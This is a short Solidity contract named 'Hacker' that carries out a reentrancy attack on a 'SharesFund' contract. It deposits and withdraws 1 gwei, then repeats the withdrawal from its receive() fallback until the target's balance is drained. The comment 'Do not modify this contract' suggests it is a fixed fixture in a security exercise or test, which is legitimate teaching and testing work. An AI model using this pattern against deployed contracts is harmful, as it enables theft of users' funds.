pragma solidity 0.8.7;

import "./SharesFund.sol";

/**
  * Do not modify this contract
 */
contract Hacker {

  SharesFund _sharesFund;
  uint counter = 0;

  constructor(SharesFund sharesFund) {
    _sharesFund = sharesFund;
  }

  receive() external payable {
    uint256 bal = _sharesFund.getBalance();
    if( bal >= 1 gwei) {
      _sharesFund.withdraw(1 gwei);
    }
  }
  

  function hack() external payable {
    require(msg.value == 1 gwei);
    _sharesFund.deposit{value: 1 gwei}();
    _sharesFund.withdraw(1 gwei);
  }

}
